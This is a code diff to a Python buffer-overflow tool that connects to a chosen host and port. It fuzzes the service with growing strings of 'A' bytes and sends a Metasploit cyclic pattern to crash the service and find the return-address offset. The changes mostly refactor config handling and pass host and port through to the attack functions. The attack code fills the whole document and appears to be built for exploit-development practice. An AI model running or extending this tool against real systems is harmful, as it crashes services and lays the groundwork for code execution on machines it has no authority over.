@@ -8,7 +8,7 @@ import time
 
 parser = argparse.ArgumentParser()
 parser.add_argument('--generate-config-template',action='store_true')
-parser.add_argument('--config',action='store_true')
+parser.add_argument('--use-local-config-file',action='store_true')
 parser.add_argument('--fuzz',action='store_true')
 parser.add_argument('--overflow',action='store_true')
 parser.add_argument('--host')
@@ -23,7 +23,7 @@ target = (ip,port)
 timeout = 3
 prefix = args.prefix
 
-def get_config():
+def use_local_config_file():
     import config
     if hasattr(config,'settings'):
         if type(config.settings) is dict:
@@ -33,7 +33,10 @@ def get_config():
                 port = config.settings['port']
                 prefix = config.settings['prefix']
                 length = config.settings['length']
-                print(mode,host,port,prefix,length)
+                if mode == 'fuzz':
+                    fuzz()
+                elif mode == 'overflow':
+                    overflow(host,port,prefix,length)
             except Exception as err:
                 print("[x] The %s key is missing from the settings variable." % err)
         else:
@@ -54,7 +57,8 @@ def generate_config_template():
     print("[+] Created a config.py template.")
     print(open("config.py","r").read())
 
-def connect():
+def connect(host,port):
+    target = (host,port)
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
     client.settimeout(timeout)
     client.connect(target)
@@ -79,13 +83,13 @@ def fuzz():
         string += "A" * 100
         time.sleep(1)
 
-def overflow(length):
+def overflow(host,port,prefix,length):
     offset = 0
     overflow = "A" * offset
     retn = ""
     padding = ""
     if subprocess.run(['which','msf-pattern_create'], stdout=subprocess.DEVNULL).returncode == 0:
-        payload = subprocess.check_output(['msf-pattern_create','-l',length],universal_newlines=True).rstrip()
+        payload = subprocess.check_output(['msf-pattern_create','-l',str(length)],universal_newlines=True).rstrip()
     else:
         print("[x] msf-pattern_create not found.")
         exit()
@@ -93,12 +97,12 @@ def overflow(length):
     bof = prefix + overflow + retn + padding + payload + suffix
 
     try:
-        client = connect()
+        client = connect(host,port)
         client.send(bytes(bof + "\r\n","latin-1"))
         client.close()
         print("[+] Sent BOF.")
         try:
-            client = connect()
+            client = connect(host,port)
             client.close()
         except:
             print("[+] Tango down!")
@@ -108,8 +112,8 @@ def overflow(length):
 if __name__ == "__main__":
     if args.generate_config_template:
         generate_config_template()
-    elif args.config:
-        get_config()
+    elif args.use_local_config_file:
+        use_local_config_file()
     elif not args.fuzz and not args.overflow:
         print("[x] Please specify an option using either --fuzz or --flood.")
     elif not args.host:
@@ -122,6 +126,6 @@ if __name__ == "__main__":
         fuzz()
     elif args.overflow:
         if args.length:
-            overflow(str(args.length))
+            overflow(args.length)
         else:
             print("[x] Please specify a pattern length using --length.")
